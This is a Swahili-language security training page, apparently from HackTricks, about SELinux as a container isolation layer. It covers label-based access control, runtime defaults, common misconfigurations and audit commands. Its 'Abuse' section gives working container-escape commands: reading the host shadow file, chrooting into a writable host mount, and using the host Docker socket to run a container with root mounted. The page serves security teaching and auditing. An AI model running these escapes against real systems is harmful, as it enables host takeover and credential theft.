# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

SELinux ni mfumo wa **Mandatory Access Control unaotegemea labels**. Kila process na object husika inaweza kuwa na security context, na policy huamua ni domains zipi zinaweza kuingiliana na types zipi na kwa namna gani. Katika mazingira ya container, kwa kawaida runtime huanzisha container process chini ya container domain yenye mipaka na kuweka labels kwenye maudhui ya container kwa types zinazolingana. Ikiwa policy inafanya kazi ipasavyo, process inaweza kusoma na kuandika vitu ambavyo label yake inatarajiwa kuvifikia, huku ikinyimwa access kwa maudhui mengine ya host, hata kama maudhui hayo yanaonekana kupitia mount.

Hii ni mojawapo ya protections zenye nguvu zaidi upande wa host zinazopatikana katika deployments kuu za Linux container. Ni muhimu hasa kwenye Fedora, RHEL, CentOS Stream, OpenShift, na ecosystems nyingine zinazotumia SELinux kwa kiwango kikubwa. Katika mazingira hayo, reviewer anayepuuza SELinux mara nyingi hataelewa kwa nini njia inayoonekana wazi ya ku-compromise host imezuiwa.

## AppArmor Vs SELinux

Tofauti rahisi zaidi ya kiwango cha juu ni kwamba AppArmor inategemea paths, wakati SELinux ni **label-based**. Hilo lina madhara makubwa kwa container security. Policy inayotegemea path inaweza kufanya kazi tofauti ikiwa maudhui yale yale ya host yataonekana chini ya mount path isiyotarajiwa. Policy inayotegemea label, badala yake, huangalia label ya object ni ipi na process domain inaweza kufanya nini kwenye object hiyo. Hii haifanyi SELinux iwe rahisi, lakini huifanya iwe imara dhidi ya aina fulani ya assumptions za path-trick ambazo defenders wakati mwingine huzifanya kwa bahati mbaya katika systems zinazotegemea AppArmor.

Kwa sababu model hii inalenga labels, container volume handling na maamuzi ya relabeling ni muhimu sana kwa security. Ikiwa runtime au operator atabadilisha labels kwa upana sana ili "kufanya mounts zifanye kazi", boundary ya policy iliyokusudiwa kuzuia workload inaweza kuwa dhaifu zaidi kuliko ilivyokusudiwa.

## Lab

Ili kuona kama SELinux iko active kwenye host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Kukagua labels zilizopo kwenye host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Ili kulinganisha uendeshaji wa kawaida na ule ambao labeling imezimwa:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Kwenye host iliyowezeshwa SELinux, huu ni mfano wa vitendo sana kwa sababu unaonyesha tofauti kati ya workload inayoendeshwa chini ya container domain inayotarajiwa na ile ambayo imeondolewa enforcement layer hiyo.

## Matumizi ya Runtime

Podman inalingana vizuri sana na SELinux kwenye systems ambazo SELinux ni sehemu ya default ya platform. Rootless Podman pamoja na SELinux ni mojawapo ya container baselines zenye nguvu zaidi zinazotumika kwa kawaida, kwa sababu process tayari haina privileges kwenye upande wa host na bado imewekewa mipaka na MAC policy. Docker pia inaweza kutumia SELinux inapoungwa mkono, ingawa administrators wakati mwingine huizima ili kukabiliana na matatizo ya volume-labeling. CRI-O na OpenShift hutegemea sana SELinux kama sehemu ya container isolation yao. Kubernetes pia inaweza kutoa settings zinazohusiana na SELinux, lakini thamani yake inategemea wazi ikiwa OS ya node kweli inasaidia na kutekeleza SELinux.

Somo linalojirudia ni kwamba SELinux si mapambo ya hiari. Kwenye ecosystems zilizojengwa kuizunguka, ni sehemu ya security boundary inayotarajiwa.

## Misconfigurations

Kosa la kawaida ni `label=disable`. Kwa upande wa uendeshaji, mara nyingi hili hutokea kwa sababu volume mount imekataliwa, na jibu la haraka la muda mfupi likawa kuiondoa SELinux kwenye suala hilo badala ya kurekebisha labeling model. Kosa lingine la kawaida ni relabeling isiyo sahihi ya host content. Broad relabel operations zinaweza kufanya application ifanye kazi, lakini pia zinaweza kupanua kile container inachoruhusiwa kugusa zaidi sana ya kilichokusudiwa awali.

Ni muhimu pia kutotofautisha vibaya SELinux **iliyowekwa** na SELinux **inayotekelezwa kwa ufanisi**. Host inaweza kusaidia SELinux na bado kuwa kwenye permissive mode, au runtime isiwe inazindua workload chini ya domain inayotarajiwa. Katika hali hizo, ulinzi huwa dhaifu zaidi kuliko documentation inavyoweza kupendekeza.

## Abuse

SELinux inapokosekana, ikiwa permissive, au ikiwa imezimwa kwa upana kwa workload, paths zilizomountiwa kutoka host huwa rahisi zaidi kutumiwa vibaya. Bind mount ileile ambayo kwa kawaida ingezuiwa na labels inaweza kuwa njia ya moja kwa moja ya kufikia host data au kufanya mabadiliko kwenye host. Hili ni muhimu hasa linapochanganywa na writable volume mounts, container runtime directories, au operational shortcuts zilizoweka wazi sensitive host paths kwa ajili ya urahisi.

SELinux mara nyingi hueleza kwa nini generic breakout writeup inafanya kazi mara moja kwenye host moja lakini inashindikana mara kwa mara kwenye nyingine, ingawa runtime flags zinaonekana kufanana. Kipengele kinachokosekana mara nyingi si namespace wala capability, bali ni label boundary iliyobaki intact.

Ukaguzi wa haraka zaidi wa vitendo ni kulinganisha active context, kisha kujaribu mounted host paths au runtime directories ambazo kwa kawaida zingekuwa label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ikiwa host bind mount ipo na SELinux labeling imezimwa au kudhoofishwa, information disclosure mara nyingi hutokea kwanza:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ikiwa mount inaweza kuandikiwa na container kwa mtazamo wa kernel inachukuliwa kuwa host-root, hatua inayofuata ni kujaribu kufanya marekebisho yaliyodhibitiwa kwenye host badala ya kubahatisha:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Kwenye hosts zenye uwezo wa kutumia SELinux, kupotea kwa labels katika runtime state directories kunaweza pia kufichua njia za moja kwa moja za privilege escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Amri hizi hazichukui nafasi ya full escape chain, lakini zinaonyesha haraka sana ikiwa SELinux ndiyo iliyokuwa ikizuia ufikiaji wa data ya host au urekebishaji wa faili upande wa host.

### Mfano Kamili: SELinux Imezimwa + Mount ya Host Inayoweza Kuandikwa

Ikiwa SELinux labeling imezimwa na filesystem ya host ime-mountiwa kwa ruhusa ya kuandikwa kwenye `/host`, full host escape huwa kesi ya kawaida ya bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ikiwa `chroot` itafanikiwa, mchakato wa container sasa unaendesha kutoka kwenye host filesystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Mfano Kamili: SELinux Imezimwa + Runtime Directory

Ikiwa workload inaweza kufikia runtime socket baada ya labels kuzimwa, escape inaweza kukabidhiwa kwa runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Jambo muhimu lililoonekana ni kwamba mara nyingi SELinux ilikuwa udhibiti uliokuwa ukizuia hasa aina hii ya ufikiaji wa host-path au runtime-state.

## Ukaguzi

Lengo la ukaguzi wa SELinux ni kuthibitisha kwamba SELinux imewezeshwa, kutambua security context ya sasa, na kuona ikiwa faili au paths unazohitaji zimewekewa mipaka kwa lebo.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Kinachovutia hapa:

- `getenforce` inapaswa kwa kawaida kurudisha `Enforcing`; `Permissive` au `Disabled` hubadilisha maana ya sehemu nzima ya SELinux.
- Ikiwa muktadha wa process ya sasa unaonekana usiotarajiwa au mpana kupita kiasi, workload huenda haiendeshwi chini ya container policy iliyokusudiwa.
- Ikiwa files zilizomountiwa kutoka host au runtime directories zina labels ambazo process inaweza kufikia kwa uhuru kupita kiasi, bind mounts huwa hatari zaidi.

Unapokagua container kwenye platform inayotumia SELinux, usichukulie labeling kama maelezo ya ziada. Mara nyingi ni mojawapo ya sababu kuu zinazofanya host isiwe tayari imecompromise.

## Runtime Defaults

| Runtime / platform | Hali ya kawaida | Tabia ya kawaida | Udhaifu wa kawaida unaowekwa manually |
| --- | --- | --- | --- |
| Docker Engine | Hutegemea host | SELinux separation inapatikana kwenye hosts zilizoenable SELinux, lakini tabia halisi hutegemea configuration ya host/daemon | `--security-opt label=disable`, relabeling pana ya bind mounts, `--privileged` |
| Podman | Kwa kawaida imeenable kwenye SELinux hosts | SELinux separation ni sehemu ya kawaida ya Podman kwenye SELinux systems isipokuwa ikiwa imezimwa | `--security-opt label=disable`, `label=false` katika `containers.conf`, `--privileged` |
| Kubernetes | Kwa kawaida haiassignwi automatically katika kiwango cha Pod | SELinux support ipo, lakini Pods kwa kawaida huhitaji `securityContext.seLinuxOptions` au defaults maalum za platform; runtime na node support zinahitajika | `seLinuxOptions` dhaifu au pana kupita kiasi, kuendesha kwenye nodes zilizo permissive/disabled, platform policies zinazozima labeling |
| CRI-O / OpenShift style deployments | Kwa kawaida hutegemewa kwa kiwango kikubwa | SELinux mara nyingi ni sehemu kuu ya node isolation model katika mazingira haya | custom policies zinazopanua access kupita kiasi, kuzima labeling kwa ajili ya compatibility |

SELinux defaults hutegemea distribution zaidi kuliko seccomp defaults. Kwenye systems za mtindo wa Fedora/RHEL/OpenShift, SELinux mara nyingi ni sehemu muhimu ya isolation model. Kwenye systems zisizo na SELinux, haipo kabisa.
{{#include ../../../../banners/hacktricks-training.md}}
